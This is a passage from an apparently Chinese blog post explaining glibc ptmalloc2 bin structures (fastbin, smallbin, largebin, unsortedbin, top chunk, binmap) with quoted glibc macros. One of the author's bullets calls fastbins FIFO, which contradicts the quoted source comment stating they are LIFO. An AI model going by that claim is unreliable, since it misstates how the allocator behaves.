<li><code>bin_at(m, i)</code> 用于获取第i个bin的地址,m应该是一个arena的地址,这里<code>bins[((i) - 1) * 2]</code>索引到要要找的bin的fd位置,然后减去偏移得到chunk头的地址,因此不存在bin_at(0)</li>
<li><code>next_bin</code>用于获取下个bin的地址</li>
<li><code>first_bin</code>用于获取某个bin链位于链表头的chunk(bin中存储的是类似于链表的头节点的一个chunk结构)</li>
<li><code>last_bin</code>用于获取某个bin链位于链表尾的chunk</li>
</ul>
<h5 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h5><p>fastbin用于存储一些常用的小内存块,节省频繁使用小内存的时候的合并,分割以及检查的时间,(由于相邻空闲块会合并, 为了防止合并,fastbin中的chunk不是free状态)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*位于malloc_chunk结构体中*/</span></span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Fastbins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An array of lists holding recently freed small chunks.  Fastbins</span></span><br><span class="line"><span class="comment">    are not doubly linked.  It is faster to single-link them, and</span></span><br><span class="line"><span class="comment">    since chunks are never removed from the middles of these lists,</span></span><br><span class="line"><span class="comment">    double linking is not necessary. Also, unlike regular bins, they</span></span><br><span class="line"><span class="comment">    are not even processed in FIFO order (they use faster LIFO) since</span></span><br><span class="line"><span class="comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span></span><br><span class="line"><span class="comment">    fastbins are normally used.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment">    other free chunks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>为了更加高效利用fastbin,fastbin是单向链表,采用FIFO策略当用户需要的chunk大小小于fastbin的最大大小的时候,ptmalloc会先判断fastbin中有无相应大小的空闲块,有的话就直接分配</li>
<li><code>malloc_consolidate</code>会释放fastbin中的所有chunk然后让他们和其他free的chunk合并</li>
<li><code>fastbin(ar_ptr, idx)</code>宏用于检索ar_ptr指向的arena的fastbin的第idx个chunk链表</li>
<li>32位fastbin默认支持的最大chunk大小为0x40字节,但是其可支持的chunk大小最大为80字节</li>
<li>fastbin支持的bin的个数最多为10个</li>
<li><code>fastbin_index(size)</code>用于得到size大小的chunk对应的fastbin的index(-2是为了当fastbin第一个bin不空着),32位除以0x8, 64位除以0x10</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在2.23的版本里有上面这几个宏,2.27的版本我没找到,这几个用于判断分配区(arena中有没有fastbinchunk)2.27好像直接在malloc_state结构体里面放了一个fastbin标志位代替这个了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> noncontiguous(M)       (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_noncontiguous(M)   ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_contiguous(M)      ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>NONCONTIGUOUS_BIT</code>这个宏用于判断MORECORE例程(main_arena中是sbr,非主分配区是mmap()),返回的是否为连续区域</li>
<li>非主分配区使用mmap分配大块虚拟内存,然后进行切分来模拟主分配区的行为(分配给程序的内存为1M,只是有读写权限的部分只有132KB,见上面多线程支持)</li>
<li>默认情况下mmap映射取余不保证虚拟地址空间连续,因此非主分配去默认分配非连续地址空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum size of memory handled in fastbins.  */</span></span><br><span class="line"><span class="keyword">static</span> INTERNAL_SIZE_T global_max_fast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks in the main arena.</span></span><br><span class="line"><span class="comment">   Since do_check_malloc_state () checks this, we call malloc_consolidate ()</span></span><br><span class="line"><span class="comment">   before changing max_fast.  Note other arenas will leak their fast bin</span></span><br><span class="line"><span class="comment">   entries if max_fast is reduced.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((s) == 0)						      \</span></span><br><span class="line"><span class="meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="function"><span class="title">get_max_fast</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ptmalloc默认情况下会调用<code>set_max_fast(s)</code>将全局变量global_max_fast设置为DEFAULT_MXFAST, 当MAX_FAST_SIZE被设置为0时,系统就不会支持fastbin</li>
<li>在2.27里面和2.23相比,get_max_fast多了一步检验global_max_fast是否大于MAX_FAST_SIZE,防止越界(虽然好像这个代码只是用来警告,不会被执行)</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span></span><br><span class="line"><span class="comment">   that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment">   fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment">   matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment">   compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment">   to lead to trimming. However, it is not dynamically tunable, since</span></span><br><span class="line"><span class="comment">   consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment">   if trimming is not used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这个宏用于控制malloc_consolidate函数</li>
<li>当free的大小大于<code>FASTBIN_CONSOLIDATION_THRESHOLD</code>时会调用malloc_consolidate</li>
</ul>
<h5 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h5><p>smallbin中每个chunk的大小与其所在bin的index的关系为: chunk_size = 2 * SIZE_SZ * index</p>
<table>
<thead>
<tr>
<th>下标</th>
<th>SIZE_SZ=4（32 位）</th>
<th>SIZE_SZ=8（64 位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>16</td>
<td>32</td>
</tr>
<tr>
<td>3</td>
<td>24</td>
<td>48</td>
</tr>
<tr>
<td>4</td>
<td>32</td>
<td>64</td>
</tr>
<tr>
<td>5</td>
<td>40</td>
<td>80</td>
</tr>
<tr>
<td>index</td>
<td>2*4*index</td>
<td>2*8*index</td>
</tr>
<tr>
<td>63</td>
<td>504</td>
<td>1008</td>
</tr>
</tbody></table>
<p>smallbin中共有62个循环双向链表,每个链表存储的chunk大小都一致,每个链表都具有头节点方便管理,对于每个bin对应的链表,采用FIFO的规则</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>SMALLBIN_CORRECTION</code> 是否需要对smallbin下标进行纠正</li>
<li><code>in_smallbin_range(sz)</code>判断是否在smallbin的范围内</li>
<li><code>smallbin_index(sz)</code>根据chunk大小得到对应的索引</li>
<li>smallbin和fastbin会有一部分重叠</li>
</ul>
<h5 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h5><p>largebin中有63个bin,每个bin中的chunk大小不同,但处于一定区间范围内,这63个bin被分成了6组,每组bin中的chunk大小之间的公差一致</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                           \</span></span><br><span class="line"><span class="meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38)                              \</span></span><br><span class="line"><span class="meta">         ? 56 + (((unsigned long) (sz)) &gt;&gt; 6)                           \</span></span><br><span class="line"><span class="meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                        \</span></span><br><span class="line"><span class="meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                     \</span></span><br><span class="line"><span class="meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                 \</span></span><br><span class="line"><span class="meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)             \</span></span><br><span class="line"><span class="meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)            \</span></span><br><span class="line"><span class="meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)       \</span></span><br><span class="line"><span class="meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)      \</span></span><br><span class="line"><span class="meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) \</span></span><br><span class="line"><span class="meta">                                 : 126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                       \</span></span><br><span class="line"><span class="meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45)                              \</span></span><br><span class="line"><span class="meta">         ? 49 + (((unsigned long) (sz)) &gt;&gt; 6)                           \</span></span><br><span class="line"><span class="meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                        \</span></span><br><span class="line"><span class="meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                     \</span></span><br><span class="line"><span class="meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                 \</span></span><br><span class="line"><span class="meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)             \</span></span><br><span class="line"><span class="meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)            \</span></span><br><span class="line"><span class="meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)       \</span></span><br><span class="line"><span class="meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)      \</span></span><br><span class="line"><span class="meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) \</span></span><br><span class="line"><span class="meta">                                 : 126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                           \</span></span><br><span class="line"><span class="meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48)                              \</span></span><br><span class="line"><span class="meta">         ? 48 + (((unsigned long) (sz)) &gt;&gt; 6)                           \</span></span><br><span class="line"><span class="meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                        \</span></span><br><span class="line"><span class="meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                     \</span></span><br><span class="line"><span class="meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                 \</span></span><br><span class="line"><span class="meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)             \</span></span><br><span class="line"><span class="meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)            \</span></span><br><span class="line"><span class="meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)       \</span></span><br><span class="line"><span class="meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)      \</span></span><br><span class="line"><span class="meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) \</span></span><br><span class="line"><span class="meta">                                 : 126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz)                                              \</span></span><br><span class="line"><span class="meta">    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16      \</span></span><br><span class="line"><span class="meta">                                   ? largebin_index_32_big(sz)          \</span></span><br><span class="line"><span class="meta">                                   : largebin_index_32(sz))</span></span><br></pre></td></tr></table></figure>

<h5 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span></span><br></pre></td></tr></table></figure>

<p>unsortedbin中的chunk主要有两个来源</p>
<ul>
<li>当一个较大的chunk被分割以后,剩下的部分如果大于MINSIZE会被放到unsortedbin中</li>
<li>释放一个不属于fastbin的chunk 且该chunk不和top chunk挨着的时候,会被放到unsortedbin中</li>
</ul>
<p>unsortedbin遍历顺序为FIFO</p>
<h5 id="通用宏"><a href="#通用宏" class="headerlink" title="通用宏"></a>通用宏</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br></pre></td></tr></table></figure>

<h5 id="topchunk"><a href="#topchunk" class="headerlink" title="topchunk"></a>topchunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment">    available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment">    any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment">    released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment">    M_TRIM_THRESHOLD).  Because top initially</span></span><br><span class="line"><span class="comment">    points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment">    extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment">    code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment">    need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment">    initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment">    interval between initialization and the first call to</span></span><br><span class="line"><span class="comment">    sysmalloc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment">    the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span></span><br></pre></td></tr></table></figure>

<ul>
<li>当所有的bin都无法满足用户请求的大小的时候,就使用topchunk进行分配,剩下为新的topchunk,main arena中通过sbrk扩展heap,thread arena中通过mmap分配新的heap</li>
<li>topchunk的prev_inuse位始终为1,否则其前面的chunk就会被合并到top chunk中</li>
</ul>
<h5 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h5><p>在用户使用malloc请求分配内存时,ptmalloc2找到的chunk可能和申请的内存大小不一致,这个时候将分割后的剩余部分叫做 last remainder chunk, unsorted bin也会存这个,topchunk分割剩下的部分不会作为last remainder</p>
<h5 id="binmap"><a href="#binmap" class="headerlink" title="binmap"></a>binmap</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br></pre></td></tr></table></figure>

<ul>
<li>为了弥补数量多的bin的问题,使用binmap结构来记录bin是否是空的,用于简化遍历,并不会在bin变成空的以后马上更新,而是在遍历过一遍发现某个bin是空的以后,会更新binmap的状态</li>
</ul>
